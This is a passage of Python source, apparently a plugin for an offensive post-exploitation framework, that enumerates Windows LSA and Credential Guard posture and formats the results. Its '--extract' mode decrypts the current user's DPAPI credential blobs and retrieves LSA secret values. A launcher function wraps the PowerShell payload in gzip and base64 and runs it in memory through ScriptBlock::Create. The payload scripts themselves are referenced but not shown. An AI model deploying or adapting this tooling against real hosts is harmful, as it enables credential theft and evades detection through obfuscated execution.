# ---------------------------------------------------------------------------

_SEV_ORDER = {"high": 0, "medium": 1, "low": 2, "info": 3}


def _as_list(value):
    if value is None:
        return []
    if isinstance(value, list):
        return value
    return [value]


def _clean_fields(fields):
    if not isinstance(fields, dict):
        return fields
    # Drop only None — keep 'N/A' so the operator sees which fields were unreadable
    return {k: v for k, v in fields.items() if v is not None}


def _format_dpapi(dpapi: dict) -> str:
    lines = []
    readable = dpapi.get("user_protect_readable")
    if readable is not None:
        lines.append(f"Master key directory readable by current user: {readable}")

    creds = _as_list(dpapi.get("user_credentials"))
    mks = _as_list(dpapi.get("user_master_keys"))
    smks = _as_list(dpapi.get("system_master_keys"))
    extracted = _as_list(dpapi.get("extracted"))

    lines.append(f"User credential blobs:   {len(creds)}")
    lines.append(f"User master keys:        {len(mks)}")
    lines.append(f"System master keys:      {len(smks)}")
    lines.append(f"Extracted (current user): {len(extracted)}")

    if creds:
        lines.append("")
        lines.append("Credential blobs (user | name | size | mtime):")
        for c in creds[:40]:
            if isinstance(c, dict):
                lines.append(
                    f"  {c.get('user','?')} | {c.get('name','?')} | "
                    f"{c.get('size','?')} | {c.get('mtime','?')}"
                )
    if mks:
        lines.append("")
        lines.append("User master keys (user | sid | guid | mtime):")
        for m in mks[:40]:
            if isinstance(m, dict):
                lines.append(
                    f"  {m.get('user','?')} | {m.get('sid','?')} | "
                    f"{m.get('guid','?')} | {m.get('mtime','?')}"
                )
    if smks:
        lines.append("")
        lines.append("System master keys (sid | mtime):")
        for s in smks[:20]:
            if isinstance(s, dict):
                lines.append(f"  {s.get('sid','?')} | {s.get('mtime','?')}")

    if extracted:
        lines.append("")
        lines.append("Extracted blobs (name | status | preview):")
        for e in extracted[:10]:
            if isinstance(e, dict):
                lines.append(
                    f"  {e.get('name','?')} | {e.get('status','?')} | "
                    f"{e.get('value_preview','N/A')}"
                )
    return "\n".join(lines)


def format_lsa_report(data: dict) -> str:
    if not isinstance(data, dict):
        return "LSA: no data collected."

    sections = []

    summary = data.get("summary") or {}
    if summary:
        sections.append(format_section("Summary", _clean_fields(summary)))

    # Findings
    findings = _as_list(data.get("findings"))
    if findings:
        findings = sorted(
            (f for f in findings if isinstance(f, dict)),
            key=lambda f: _SEV_ORDER.get(str(f.get("severity", "info")).lower(), 9),
        )
        lines = []
        for f in findings:
            sev = str(f.get("severity", "info")).upper()
            kind = f.get("kind", "?")
            detail = f.get("detail", "")
            lines.append(f"[{sev:<6}] {kind}: {detail}")
        sections.append(format_list_section("Findings", lines))
    else:
        sections.append(format_list_section(
            "Findings", ["(none) - no hardening gaps detected"]
        ))

    # Raw config blocks — N/A values render as "N/A" (not stripped)
    for key, label in (
        ("lsa", "LSA"),
        ("credential_guard", "Credential Guard"),
        ("device_guard", "Device Guard"),
        ("virtualization_based_security", "VBS / HVCI"),
        ("ntlm", "NTLM (MSV1_0)"),
        ("kerberos", "Kerberos"),
        ("winlogon", "Winlogon"),
        ("wdigest", "WDigest"),
        ("domain", "Domain"),
        ("token_privileges", "Token Privileges"),
        ("audit_policy", "Audit Policy"),
        ("laps", "LAPS"),
    ):
        block = data.get(key)
        cleaned = _clean_fields(block)
        if isinstance(cleaned, dict) and cleaned:
            sections.append(format_section(label, cleaned))

    # Package lists
    for key, label in (
        ("authentication_packages", "Authentication Packages"),
        ("security_packages", "Security Packages"),
        ("notification_packages", "Notification Packages"),
    ):
        items = [str(x) for x in _as_list(data.get(key)) if x]
        if items:
            sections.append(format_list_section(label, items[:64]))

    # DPAPI
    dpapi = data.get("dpapi") or {}
    if isinstance(dpapi, dict) and not dpapi.get("skipped"):
        sections.append(_format_dpapi(dpapi))

    # LSA Secrets
    secrets = data.get("lsa_secrets") or {}
    if isinstance(secrets, dict) and not secrets.get("skipped"):
        names = [str(n) for n in _as_list(secrets.get("names")) if n]
        if names:
            sections.append(format_list_section("LSA Secrets (names)", names[:60]))
        elif not secrets.get("readable"):
            sections.append(format_list_section(
                "LSA Secrets (names)",
                ["N/A (not readable -- requires SYSTEM)"],
            ))
        extracted = _as_list(secrets.get("extracted"))
        if extracted:
            lines = []
            for e in extracted[:15]:
                if isinstance(e, dict):
                    lines.append(
                        f"{e.get('name','?')} | {e.get('status','?')} | "
                        f"{e.get('value_b64','N/A')[:80]}"
                    )
            sections.append(format_list_section("LSA Secrets (extracted)", lines))
        status = secrets.get("extract_status")
        if status and status != "N/A":
            sections.append(format_section("LSA Secrets (extract status)", {"status": status}))

    # TPM
    tpm = _clean_fields(data.get("tpm"))
    if isinstance(tpm, dict) and tpm.get("present"):
        sections.append(format_section("TPM", tpm))

    return "\n\n".join(sections) if sections else "LSA: no data collected."


def format_lsa_extract_report(data: dict) -> str:
    if not isinstance(data, dict):
        return "LSA extract: no data collected."

    sections = []

    summary = data.get("summary") or {}
    if summary:
        sections.append(format_section("Summary", _clean_fields(summary)))

    dpapi = _as_list(data.get("dpapi_extracted"))
    if dpapi:
        lines = []
        for e in dpapi[:15]:
            if isinstance(e, dict):
                err = e.get('error') or ''
                suffix = f" | {err[:60]}" if err else ''
                preview = str(e.get('value_preview', 'N/A'))[:60]
                lines.append(
                    f"{e.get('name','?')} | {e.get('status','?')}{suffix} | {preview}"
                )
        sections.append(format_list_section("Credentials (current user)", lines))
    else:
        sections.append(format_list_section(
            "Credentials (current user)", ["(none found)"]
        ))

    lsa = _as_list(data.get("lsa_extracted"))
    if lsa:
        lines = []
        for e in lsa[:20]:
            if isinstance(e, dict):
                v = str(e.get("value_b64", "N/A"))
                lines.append(
                    f"{e.get('name','?')} | {e.get('status','?')} | {v[:60]}"
                )
        sections.append(format_list_section("LSA Secrets", lines))
    else:
        status = data.get("lsa_extract_status", "N/A")
        sections.append(format_list_section(
            "LSA Secrets", [f"(none extracted -- status: {status})"]
        ))

    return "\n\n".join(sections) if sections else "LSA extract: no data collected."


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def _wrap_launcher(ps: str) -> str:
    compressed = gzip.compress(ps.encode('utf-8'), compresslevel=9)
    b64 = base64.b64encode(compressed).decode('ascii')
    return (
        "$b='" + b64 + "';"
        "$r=[Convert]::FromBase64String($b);"
        "$ms=New-Object IO.MemoryStream(,$r);"
        "$gz=New-Object IO.Compression.GZipStream($ms,"
        "[IO.Compression.CompressionMode]::Decompress);"
        "$sr=New-Object IO.StreamReader($gz);"
        "$src=$sr.ReadToEnd();"
        "$sr.Close();$gz.Close();$ms.Close();"
        "&([ScriptBlock]::Create($src))"
    )


def build_command(deep: bool = False, extract: bool = False) -> str:
    if extract:
        # Extraction-only path: no posture enumeration, no DPAPI store
        # walk, no LSA-secret name listing. Just the decrypt attempts.
        ps = _PS_EXTRACT
        ps = ps.replace(
            '@@LSA_BOOTSTRAP@@',
            base64.b64encode(_LSA_CS.encode('utf-8')).decode('ascii'),
        )
    else:
        # Posture collector. Its own --extract code paths are inert here
        # because $EXTRACT is forced to $false; extraction is a separate
        # script invoked by the --extract branch above.
        ps = _PS
        ps = ps.replace('@@DEEP@@', '$true' if deep else '$false')
        ps = ps.replace('@@EXTRACT@@', '$false')
        ps = ps.replace('@@LSA_BOOTSTRAP@@', '')

    ps = ps.replace('@@START@@', PLUGIN_MARK_START)
    ps = ps.replace('@@END@@', PLUGIN_MARK_END)
    return _wrap_launcher(ps)

@plugin.command(
    name='lsa',
    platforms=['windows'],
    description='Enumerate LSA protection, Credential Guard, VBS, DPAPI posture, and authentication security configuration',
)
def run(session: SessionContext, args):
    args = args or []
    if any(a in ('-h', '--help') for a in args):
        session.print("Usage: run lsa [--deep | --extract]", "yellow")
        session.print("  (no args)   Posture enumeration only (fast, read-only).", "yellow")
        session.print("  --deep      Adds DPAPI store and LSA secret *name* enumeration.", "yellow")
        session.print("  --extract   Extraction only: decrypt current-user DPAPI blobs", "yellow")
        session.print("              and retrieve LSA secret values. Needs SYSTEM for", "yellow")
        session.print("              LSA secret values. Does not run posture enumeration.", "yellow")
        return 0

    extract = '--extract' in args
    deep = ('--deep' in args) and not extract

    if extract:
        return run_collector_plugin(
            session,
            'lsa',
            None,
            lambda: build_command(deep=False, extract=True),
            format_lsa_extract_report,
            timeout=90.0,
        )

    return run_collector_plugin(
        session,
        'lsa',
        None,
        lambda: build_command(deep=deep, extract=False),
        format_lsa_report,
        timeout=90.0 if deep else 45.0,
    )